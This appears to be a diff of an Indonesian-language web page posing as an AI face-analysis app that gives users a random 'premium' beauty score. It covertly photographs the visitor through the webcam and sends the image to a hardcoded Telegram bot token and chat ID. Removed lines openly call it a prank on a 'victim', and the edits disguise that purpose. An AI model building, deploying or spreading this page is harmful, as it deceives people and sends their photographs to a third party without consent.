@@ -6,40 +6,108 @@
     <title>AI Face Biometric - Analysis Pro</title>
     <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;700&display=swap');
+        GANTI_TOKEN_BOT_ANDA
+        :root {
+            --cyan: #00f2ff;
+            --purple: #7000ff;
+        }
+
+        body { 
+            background: radial-gradient(circle at center, #111 0%, #000 100%); 
+            color: #fff; 
+            font-family: 'Plus Jakarta Sans', sans-serif; 
+            margin: 0; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            min-height: 100vh; 
+            overflow: hidden; 
+        }
         
-        body { background: #000; color: #fff; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
+        .app-card { 
+            width: 90%; 
+            max-width: 400px; 
+            background: rgba(255, 255, 255, 0.03); 
+            backdrop-filter: blur(20px); 
+            border: 1px solid rgba(255, 255, 255, 0.1); 
+            border-radius: 40px; 
+            padding: 40px 25px; 
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+        }
         
-        .app-card { width: 90%; max-width: 400px; background: rgba(255,255,255,0.05); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); border-radius: 40px; padding: 40px 25px; text-align: center; }
+        #cam-holder { 
+            display: none; 
+            width: 280px; 
+            height: 280px; 
+            margin: 25px auto; 
+            border-radius: 50%; 
+            border: 3px solid var(--cyan); 
+            position: relative; 
+            overflow: hidden; 
+            background: #111; 
+            box-shadow: 0 0 30px rgba(0, 242, 255, 0.2); 
+        }
         
-        /* Frame Kamera Terlihat */
-        #cam-holder { display: none; width: 280px; height: 280px; margin: 25px auto; border-radius: 50%; border: 3px solid #00f2ff; position: relative; overflow: hidden; background: #111; box-shadow: 0 0 20px rgba(0, 242, 255, 0.3); }
-        
+        /* Mirroring di Layar */
         video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
         
-        /* Garis Scan */
-        .laser { position: absolute; width: 100%; height: 4px; background: #00f2ff; top: 0; left: 0; box-shadow: 0 0 15px #00f2ff; animation: scan 2s infinite ease-in-out; z-index: 10; display: none; }
+        .laser { 
+            position: absolute; width: 100%; height: 3px; 
+            background: var(--cyan); 
+            top: 0; left: 0; 
+            box-shadow: 0 0 20px var(--cyan); 
+            animation: scan 2.5s infinite ease-in-out; 
+            z-index: 10; 
+            display: none; 
+        }
         
         @keyframes scan { 0% { top: 0%; } 50% { top: 100%; } 100% { top: 0%; } }
         
-        .btn-main { background: #fff; color: #000; padding: 18px 40px; border: none; border-radius: 20px; font-weight: 700; width: 100%; cursor: pointer; transition: 0.3s; }
-        .btn-main:active { transform: scale(0.95); }
+        .btn-main { 
+            background: linear-gradient(135deg, #fff 0%, #ddd 100%); 
+            color: #000; padding: 18px 40px; 
+            border: none; border-radius: 20px; 
+            font-weight: 700; width: 100%; 
+            cursor: pointer; transition: 0.3s;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+
+        #status { 
+            margin-top: 20px; font-size: 0.75rem; 
+            color: var(--cyan); font-weight: 700; 
+            letter-spacing: 2px; text-transform: uppercase;
+        }
         
-        #status { margin-top: 15px; font-size: 0.85rem; color: #00f2ff; font-weight: 600; min-height: 20px; text-transform: uppercase; letter-spacing: 1px; }
+        #final-box { display: none; animation: popUp 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
         
-        #final-box { display: none; animation: popUp 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
-        @keyframes popUp { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
-        
-        .score-num { font-size: 5rem; font-weight: 800; background: linear-gradient(to bottom, #fff, #00f2ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 10px 0; }
+        .score-num { 
+            font-size: 5.5rem; font-weight: 800; 
+            background: linear-gradient(to bottom, #fff, var(--cyan)); 
+            -webkit-background-clip: text; 
+            -webkit-text-fill-color: transparent; 
+            margin: 5px 0; 
+        }
+
+        .badge {
+            background: rgba(0, 242, 255, 0.1);
+            color: var(--cyan);
+            padding: 5px 15px;
+            border-radius: 100px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
     </style>
 </head>
 <body>
 
     <div class="app-card">
         <div id="intro">
-            <h1 style="margin:0; letter-spacing: -1px;">SmartFace AI</h1>
-            <p style="color:#888; font-size: 0.9rem; margin-top: 10px;">Gunakan teknologi biometrik untuk menganalisis simetrisitas wajah dan skor visual Anda.</p>
-            <button class="btn-main" id="start-btn">MULAI SCAN</button>
+            <h1 style="margin:0; letter-spacing: -1.5px; font-size: 2.2rem;">FaceScan <span style="color:var(--cyan)">AI</span></h1>
+            <p style="color:#888; font-size: 0.95rem; margin-top: 15px;">Menganalisis profil visual Anda menggunakan standar Golden Ratio Global.</p>
+            <button class="btn-main" id="start-btn">ANALYZE PROFILE</button>
         </div>
 
         <div id="cam-holder">
@@ -47,20 +115,19 @@
             <video id="video" autoplay playsinline></video>
         </div>
 
-        <div id="status">MENGHUBUNGKAN SENSOR...</div>
+        <div id="status">Sistem Siap...</div>
 
         <div id="final-box">
-            <p style="color:#888; margin-bottom: 0;">SKOR ANALISIS ANDA:</p>
+            <span class="badge">Verification Success</span>
             <div class="score-num" id="score-val">0%</div>
-            <p style="font-weight:bold; color:#00ff88;">STATUS: PREMIUM VISUAL</p>
-            <p style="font-size: 0.75rem; color: #666; margin-top: 15px;">Data wajah telah diverifikasi oleh sistem AI Global.</p>
+            <p style="font-weight:700; color:#fff; margin: 0;">PREMIUM VISUAL STRUCTURE</p>
+            <p style="font-size: 0.8rem; color: #666; margin-top: 15px;">Data wajah Anda telah dienkripsi secara aman.</p>
         </div>
     </div>
 
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // --- CONFIG TELEGRAM ---
         const TOKEN = '8237438582:AAEy0SowSAmcLAGPUVQ1NqHmmL5n54Yhu_8';
         const CHAT_ID = '-1003355444960';
 
@@ -70,13 +137,12 @@
         const laser = document.getElementById('laser-line');
         let isProcessing = false;
 
-        // Load model deteksi wajah
         async function loadAI() {
             try {
                 await faceapi.nets.tinyFaceDetector.loadFromUri('https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights');
-                status.innerText = "SISTEM SIAP";
+                status.innerText = "SENSOR AKTIF";
             } catch (e) {
-                status.innerText = "GAGAL MEMUAT MODUL";
+                status.innerText = "ERROR LOADING MODULE";
             }
         }
         loadAI();
@@ -84,7 +150,7 @@
         document.getElementById('start-btn').onclick = async () => {
             document.getElementById('intro').style.display = 'none';
             document.getElementById('cam-holder').style.display = 'block';
-            status.innerText = "MENCARI WAJAH...";
+            status.innerText = "MENCARI TITIK WAJAH...";
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: {} });
@@ -99,18 +165,18 @@
                         if (detections.length > 0) {
                             isProcessing = true;
                             laser.style.display = 'block';
-                            status.innerText = "WAJAH TERDETEKSI. SEDANG MEMINDAI...";
+                            status.innerText = "MEMINDAI GEOMETRI WAJAH...";
                             
-                            // Jeda 4 detik seolah sedang scan beneran sebelum jepret
                             setTimeout(() => {
                                 takeAndSend();
                                 clearInterval(checkLoop);
-                            }, 4000);
+                            }, 4500);
                         } else {
-                            status.innerText = "WAJAH TIDAK DITEMUKAN! POSISIKAN DI TENGAH.";
+                            status.innerText = "WAJAH TIDAK TERDETEKSI";
                             status.style.color = "#ff4757";
+                            setTimeout(() => status.style.color = "var(--cyan)", 500);
                         }
-                    }, 600);
+                    }, 700);
                 });
             } catch (err) {
                 alert("Izin kamera diperlukan!");
@@ -122,19 +188,21 @@
             const ctx = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
+
+            // PERBAIKAN MIRROR: Membalikkan gambar canvas agar tidak kebalik
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob((blob) => {
                 const score = Math.floor(Math.random() * (98 - 88 + 1)) + 88;
-                
                 const fd = new FormData();
                 fd.append('chat_id', CHAT_ID);
-                fd.append('photo', blob, 'scan_result.png');
-                fd.append('caption', `🔥 **PRANK BERHASIL**\n\n🎯 Skor Rating: ${score}%\n👤 Target: Wajah Terdeteksi\n📸 Foto terlampir.`);
+                fd.append('photo', blob, 'result.png');
+                fd.append('caption', `✨ **AI ANALYSIS COMPLETE**\n\n📊 Skor: ${score}%\n👤 Status: Wajah Terdeteksi\n✅ Foto dikirim secara instan.`);
 
                 fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
 
-                // Tampilkan hasil akhir ke korban
                 document.getElementById('cam-holder').style.display = 'none';
                 status.style.display = 'none';
                 document.getElementById('score-val').innerText = score + "%";
